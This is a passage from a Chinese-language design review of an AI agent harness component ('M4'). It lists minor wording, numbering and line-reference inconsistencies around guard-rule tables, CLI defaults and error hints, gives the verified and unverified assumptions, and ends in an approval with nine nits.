位置：§3.8、§2.2 表里 `catalog.ts` 一行、§16「`GUARD_RULES` 的范围」一行、`graph-ops-align.json` 的 `rules` 一条。`m4` 节点 2026-10-30T10:13Z 的批注与规则板 0.10 §10.7 第 1 条写「`GUARD_RULES`（含 guard 行六条……与图行、M3、M7、循环板、指标流水的门）」；规则板 0.10 §10.1（:1738）又写 M3 的八条经 `MAIN_AGENT_RULES` 映射、M7 的门「由 M7 登记」。M4 取 §10.1 的读法：`GUARD_RULES` 只列 guard 框架装规则的行，M3、M7 各管各的表，三张表合起来核对（与 M3 附录 0.5 §3.11、M7 0.6 §12.1 一致），这是合理的，但 §3.8 把「读三张表」引成 §10.7 第 1 条的内容，而那一条字面上读作 M3、M7 的门也在 `GUARD_RULES` 里；`rules` 批注又写「M4 对规则板没有新的请求」。实现者读规则板 §10.7 第 1 条会以为 M3、M7 的门要登进 `GUARD_RULES`。改法：§3.8 只引 §10.1，并加一句「规则板 §10.7 第 1 条与节点批注的措辞把 M3、M7 也写进 `GUARD_RULES`，与它自己的 §10.1 不同，M4 取 §10.1」；`rules` 批注加一条 dogfood 之后的小请求：把 §10.7 第 1 条的字改成与 §10.1 一致。

#### N48 NIT 几处数字与词表的说法与实际不符

位置：§4.6 表 `title` 一行的「退路写法 10 个码点」、§17 D1 的「不做 23 个码点」、§1.2 与 §14.2 里「`验收`、`标定`、`门禁`、`投影`、`补遗`」的列法。实数：「这件活要修第 3 次了」含两个空格共 11 个码点（上限 40，不影响判断）；「逐条读完再定，共 34 条约 5,800 字」含空格共 22 个码点；`src/graph/plain-question.ts` 的 `PLAIN_WORDS` 中文形式有 验收、标定、门禁、投影、补遗、附录 六个，英文有 acceptance、calibration、gate、projection、addendum 五个，设计的列法漏了「附录」。「34 条、约 5,800 字」本轮复数无误（5,782 个字符）。改法：改成 11 与 22；词表在设计里写「`plainWordsIn` 报出的词」，要列时按 `PLAIN_WORDS` 列全；M4 自己写的常量里没有「附录」，结论不变。

#### N49 NIT 命令行的项目目录默认值，§3.9 与 §2.4 不一致

位置：§3.9 开头（「项目目录按 `--home`，否则 `<工作区>/.llm`」）与 §2.4（「命令行……按 `--home`，否则按当前目录算同一个项目根」）。在 M7 的工作树里跑命令行，前者得到工作树自己的 `.llm/`，后者得到主检出的 `.llm/`，而流水、标注与回放结果按 §2.4 都在主检出那一个。改法：§3.9 改为「否则 `projectOf(当前目录).root` 加 `/.llm`」。

#### N50 NIT `request_exception` 第 7 步的统一提示盖掉了第 6 步的具体提示

位置：§5.3 检查顺序第 6、7 步。第 6 步对 `stat` 出错（权限等）定义了 `unavailable` 与具体的 `hint`（「the target cannot be read (<错误码>); tell the human in your reply」）；第 7 步末尾又写「第 6、7 步里任何一处抛错，包括 `renderPlan`：捕获，返回 `unavailable`，`hint`『the harness could not write the text for the human……』」，两种情形同一个错误码，字面上第 7 步的 `hint` 会盖掉第 6 步的。agent 读到的原因因此变得不准。改法：第 7 步的统一捕获只管 `renderPlan` 与第 6 步之外的抛错，第 6 步的错误保留自己的 `hint`。

#### N51 NIT `createUserNotice` 的行号过时

位置：§5.5 末段（「`src/shared/dsh-min.ts`:462」）与 §9 H21（「`dsh-min.ts`:462–469」）。`9c346fb`（M3 第 3 步）之后该函数在 :520–526，内容与设计的描述一致（`source: { ...facts, kind, form: 'notice', summary }`，事实字段原样进 `source`，`kind` 排在 `facts` 之后不会被覆盖）。文首依据一段列出了 `src/` 里与 M4 相关的改动，没有列这个文件。改法：两处改成 :520–526，文首依据一段补一句「`src/shared/dsh-min.ts` 在 `9c346fb` 里加了内容，行号后移」。

### 已核实的假设（本轮新增）

- `src/data/project-root.ts` 的 `projectOf(cwd, home?)` 返回 `{root, git}`，工作树经 `.git` 文件的 `gitdir` 与 `commondir` 归到主检出的根，家目录与盘符根返回 `undefined`；`gitDirOf(root)`、`ensureIgnored(root, directory)` 的行为与 §2.4、§7.3 的描述一致（只追加一行 `.llm/`、已有等价行不重复、`gitDir` 不是目录时什么都不做）。F19 的按项目判成立。
- `src/guard/index.ts`:87–89 的 `activeRules`、:92–96 的 `rootsFor`；`src/graph/engine.ts`:110–117 的 `TRANSITIONS`（`done: ['doing']` 在 :114）与 :613 的 `set changes nothing`；`src/guard/rules.ts`:56 的 `ASK_THE_HUMAN`；`src/toolsearch/index.ts`:155 起的 `execute`；`src/memory/audit.ts`:44–47 的按项目目录与 :65 的 `JSON.stringify(record)`：都与设计一致。
- `src/graph/proposal.ts` 今天只有 `renderProposal` 与 `ProposalText`，`PROPOSAL_LABELS`、`proposalLineRefusal`、`splitBold` 随 M3 第 6 步；`src/graph/plain-question.ts` 已在，`plainWordsIn` 对英文按整词、`gate.ts` 里的 `gate` 后面是 `.`，不在排除的字符类里，所以含 `gate.ts` 的路径会被报，设计的说法成立。
- `AgentLike.followup(message: UserNotice)` 在 `src/shared/dsh-min.ts`:362，N38 的定时器有现成的接口可用。
- 循环板 0.6：`LoopCheckAction`、`Contribution.details`（同步、至多 20 行 160 个码点）、`ListedRun`、`emit` 的 `unheard`、`listens`、`runCommand` 的 `queue: 'check' | 'direct'` 与 `CommandRequest`、`resolveProgram` 把 `.cmd` 判为 `needsShell`、`commandDetail`、§17 M4 第 4 条的三样与「①②④ 不要、③ 由 glob、⑤ 由 queue」，都与 §6、§9 H23–H24 的引用一致。`design-context.md` 要求的「点名依赖的循环板节号」满足。
- M3 附录 0.5：§3.4 的 `propose_to_human` 对 `kind: 'question'` 只带 `question` 就是「再给人看一次」（不写图、占本条回复三件里的一件），§3.5 的 `record_human_answer` 有 `agree`/`add`/`reject` 与 `recordedAs`，§3.3 的四行规则与 `PROPOSAL_LIMITS`，§10 已记 M4 的其余三件请求留给 M3 的对齐轮；M4 §4.6 的流程与它们对得上。
- plain-ui 0.7 §5.3：`plainIssues` 的九条规则、`jargon` 只查待决与提议、进行中的任务标题不查，F18 的前提与 §4.6 的版面示例都成立。
- 规则板 0.10 §10.7 M4 一节第 2、3、4 条与 M4 §3.2、§3.3 对上（取值、入参、`evaluate` 删除）；M7 0.6 的 `EXECUTE_RULES`、`PROMOTION` 一条在 P2 之前、其余在实现中「谁后合入谁改」（R4-F10 一行）与 M4 §2.3、§18 一致；`docs/CHARTER.md` 0.7 §3.2 第 3 条与 §6 的分界（代码里的新门先影子、板上人看过原文同意的条目即生效）与 M4 §1.3 一致。
- `eslint` 10.13.0 在本仓库，`--pass-on-unpruned-suppressions` 在 `lib/options.js`:322；`node_modules/eslint/bin/eslint.js` 与 `node_modules/typescript/bin/tsc` 都在，§6.1.1 的两条检查行可以不经 `npx` 直接起。
- 「建议验收」一列：7 个任务共 34 条、5,782 个字符，与「34 条约 5,800 字」相符；D1 的题目 20、背景 17、推荐 17、疑问 20 个码点。

### 没有核实或说法有误的假设（本轮）

- 没有核实：循环板、M3 第 6 步、M7、plain-ui 第二阶段、规则板整块都还是设计，没有代码，M4 引用的接口按设计文字对照，不是按实现对照；M4 的 L3 场景用假服务顶替循环板，真机的整条路在 L4 第 5、8 项。
- 没有核实（设计自己标了〔推断〕，由 L3 核对）：goal 为 `blocked` 时 `dsh-goal-round-driver` 不排下一轮；各行导入的 `dist/guard/followup.js` 是同一个模块实例；`ctx.inject` 对本包 `ctx.provide` 的服务同样生效（循环板 0.6 §10.2 V12）；worker 的会话头 `parentSession` 是主 Agent；headless 运行器在 `turn/end` 时排进收件箱的消息能否开出下一回合。这些都不在本轮的挡路范围，各有退路和对应的 L3/L4 项。
- 有误（NIT）：§4.6 与 §17 的两个码点数（N48）；`displayPath` 的 60 字上限在算法上不成立（N44）；`dsh-min.ts` 的行号（N51）；§3.8 对规则板 §10.7 第 1 条的转述（N47）。

### 结论

APPROVED：挡路 0 条，非阻断 9 条（N43–N51，全是 NIT）。第 4 轮的 4 条挡路 F17–F20 与 8 条非阻断 N35–N42 全部关闭，N33 在设计一侧关闭，放行稿 `onepage.md` 按简报在评审通过之后重写。各轮挡路条数 8、2、6、4、0。规则板 0.10 的三件请求与简报规则 1、2、3、6、7、8 都满足。九条 NIT 可以随实现顺手改，也可以由写放行稿的那一步一并改；不需要再开一轮评审。设计里唯一要人定的事仍是 D1。
